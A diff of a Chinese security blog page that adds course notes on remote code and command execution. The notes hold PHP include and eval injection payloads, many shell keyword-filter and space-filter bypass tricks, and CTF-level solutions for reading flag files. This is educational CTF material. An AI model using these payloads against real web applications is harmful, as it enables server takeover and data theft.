@@ -201,6 +201,144 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/14/58WEB%E6%94%BB%E9%98%B2-RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/14/58WEB%E6%94%BB%E9%98%B2-RCE/" class="post-title-link" itemprop="url">58WEB攻防-RCE</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-14 15:51:03 / 修改时间：16:04:17" itemprop="dateCreated datePublished" datetime="2023-11-14T15:51:03+08:00">2023-11-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>52、RCE-原理-代码执行&amp;命令执行</li>
+<li>53、RCE-黑白盒-过滤绕过&amp;不回显方案</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE代码执行：引用脚本代码解析执行<br>RCE命令执行：脚本调用操作系统命令<br>漏洞函数：  </p>
+<ul>
+<li>1.PHP：<br>PHP代码执行函数：<br>&nbsp;&nbsp;&nbsp;&nbsp;eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等<br>PHP命令执行函数：<br>&nbsp;&nbsp;&nbsp;&nbsp;system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等  </li>
+<li>2.Python：<br>eval exec subprocess os.system commands   </li>
+<li>3.Java：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</li>
+</ul>
+<h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p>脚本——java，php，python<br>产生——Web源码、中间件平台、其他环境<br>检测——白盒 代码审计<br>检测——黑盒 漏扫工具、公开漏洞、手工看参数及功能点<br>防御——敏感函数禁用、变量过滤或固定、WAF产品  </p>
+<h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p>系统——Linux、Windows<br>产生——web源码、中间件平台、其他环境<br>检测——白盒 代码审计<br>检测——黑盒 漏扫工具，公开漏洞，手工看参数及功能点<br>防御——敏感函数禁用、变量过滤或固定、WAF产品  </p>
+<h2 id="RCE-利用-绕过-异或-回显"><a href="#RCE-利用-绕过-异或-回显" class="headerlink" title="RCE-利用&amp;绕过&amp;异或&amp;回显"></a>RCE-利用&amp;绕过&amp;异或&amp;回显</h2><h3 id="1、伪协议玩法"><a href="#1、伪协议玩法" class="headerlink" title="1、伪协议玩法"></a>1、伪协议玩法</h3><p>配合文件包含伪协议（代码执行）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;ver&#x27;);?&gt;</span><br><span class="line">include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<h4 id="（1）关键字过滤："><a href="#（1）关键字过滤：" class="headerlink" title="（1）关键字过滤："></a>（1）关键字过滤：</h4><ul>
+<li>1、过滤flag关键字<br>通配符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag=fl*</span><br><span class="line">cat fl*</span><br><span class="line">cat ?la*</span><br></pre></td></tr></table></figure></li>
+<li>2、转义符号  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure></li>
+<li>2、1使用空变量$*和$@，$x,${x}绕过  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t fl$*ag</span><br><span class="line">ca$@t fl$@ag</span><br><span class="line">ca$5t f$5lag</span><br><span class="line">ca$&#123;2&#125;t f$&#123;2&#125;lag</span><br></pre></td></tr></table></figure></li>
+<li>3、拼接法</li>
+</ul>
+<p><code>a=fl;b=ag;cat$IFS$a$b</code></p>
+<ul>
+<li>4、反引号绕过:</li>
+</ul>
+<p>&#96;&#96;&#96;cat &#96;ls&#96;&#96;&#96;&#96;</p>
+<ul>
+<li>5、编码绕过:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;flag&#x27; | base64</span><br><span class="line">cat `echo ZmxhZwo= | base64 -d`</span><br></pre></td></tr></table></figure></li>
+<li>6、组合绝活  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t &gt;shell</span><br><span class="line">sh shell</span><br><span class="line">// \指的是换</span><br><span class="line">// ls -t是将文本按时间排序输出</span><br><span class="line">// ls -t &gt;shell  将输出输入到shell文件中</span><br><span class="line">// sh将文本中的文字读取出来执行</span><br></pre></td></tr></table></figure></li>
+<li>7、异或无符号（过滤0-9a-zA-Z）<br>异或：rce-xor.php &amp; rce-xor.py<br>或：rce-xor-or.php &amp; rce-xor-or.py</li>
+</ul>
+<h4 id="（2）过滤函数关键字"><a href="#（2）过滤函数关键字" class="headerlink" title="（2）过滤函数关键字"></a>（2）过滤函数关键字</h4><ul>
+<li>1、内敛执行绕过（system）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `ls`;</span><br><span class="line">echo $(ls);</span><br><span class="line">?&gt;&lt;?=`ls`;</span><br><span class="line">?&gt;&lt;?=$(ls);</span><br></pre></td></tr></table></figure></li>
+<li>2、过滤执行命令（如cat tac等）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br><span class="line">curl file:///root/f/flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br></pre></td></tr></table></figure></li>
+<li>3、过滤空格  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%09（url传递）(cat%09flag.php)</span><br><span class="line">cat$&#123;IFS&#125;flag</span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="（3）无回显利用"><a href="#（3）无回显利用" class="headerlink" title="（3）无回显利用"></a>（3）无回显利用</h4><p>1、直接写个文件访问查看<br>2、直接进行对外访问接受  </p>
+<h2 id="白盒-CTF-RCE代码命令执行"><a href="#白盒-CTF-RCE代码命令执行" class="headerlink" title="白盒-CTF-RCE代码命令执行"></a>白盒-CTF-RCE代码命令执行</h2><ul>
+<li>29-通配符</li>
+</ul>
+<p><code>system(&#39;tac fla*.php&#39;);</code></p>
+<ul>
+<li>30-取代函数&amp;通配符&amp;管道符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`cp fla*.ph* 2.txt`;</span><br><span class="line">echo shell_exec(&#x27;tac fla*.ph*&#x27;);</span><br></pre></td></tr></table></figure></li>
+<li>31-参数逃逸</li>
+</ul>
+<p><code>eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p>
+<ul>
+<li>32~36-配合包含&amp;伪协议  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></li>
+<li>37~39-包含RCE&amp;伪协议&amp;通配符  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;tac fla*&#x27;);?&gt;</span><br><span class="line">php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="黑盒-运行-RCE代码命令执行"><a href="#黑盒-运行-RCE代码命令执行" class="headerlink" title="黑盒-运行-RCE代码命令执行"></a>黑盒-运行-RCE代码命令执行</h2><p>代码在线运行平台测试  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/11/57WEB%E6%94%BB%E9%98%B2-SSRF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1258,109 +1396,6 @@
 
  
 
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">48WEB攻防-php文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-24 19:45:22" itemprop="dateCreated datePublished" datetime="2023-10-24T19:45:22+08:00">2023-10-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:25:51" itemprop="dateModified" datetime="2023-11-06T21:25:51+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>837</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>24、PHP-中间件-文件上传-CVE&amp;配置解析</li>
-<li>25、PHP-编辑器-文件上传-第三方引用安全</li>
-<li>26、PHP-CMS源码-文件上传-已知识别到利用</li>
-</ul>
-<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p>
-<p> <img src="/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.png"></p>
-<h2 id="PHP-中间件-上传相关-Apache-Nginx"><a href="#PHP-中间件-上传相关-Apache-Nginx" class="headerlink" title="PHP-中间件-上传相关-Apache&amp;Nginx"></a>PHP-中间件-上传相关-Apache&amp;Nginx</h2><p>复现漏洞环境：vulhub （部署搭建看打包视频）<br>由于PHP搭建常用中间件：IIS，Apache，Nginx<br>Web搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传  </p>
-<h2 id="PHP-编辑器-上传相关-第三方处理引用"><a href="#PHP-编辑器-上传相关-第三方处理引用" class="headerlink" title="PHP-编辑器-上传相关-第三方处理引用"></a>PHP-编辑器-上传相关-第三方处理引用</h2><p>复现漏洞环境：ueditor （部署搭建看打包视频）<br>由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路<br>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2200036">https://cloud.tencent.com/developer/article/2200036</a><br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45813980/article/details/126866682">https://blog.csdn.net/qq_45813980/article/details/126866682</a><br>引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全  </p>
-<h2 id="PHP-CMS源码-上传相关-已知识别到利用"><a href="#PHP-CMS源码-上传相关-已知识别到利用" class="headerlink" title="PHP-CMS源码-上传相关-已知识别到利用"></a>PHP-CMS源码-上传相关-已知识别到利用</h2><p>复现漏洞环境：通达OA-V11.2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从未知的源码体系测试原生态上传安全，现在是已知CMS源码架构，利用已知的漏洞测试  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
 
   
   <nav class="pagination">
@@ -1432,7 +1467,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1508,19 +1543,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">167k</span>
+    <span title="站点总字数">173k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:32</span>
+    <span title="站点阅读时长">2:37</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共62.6k字</span>
+  <span class="post-count">博客全站共64.1k字</span>
 </div>
 
 
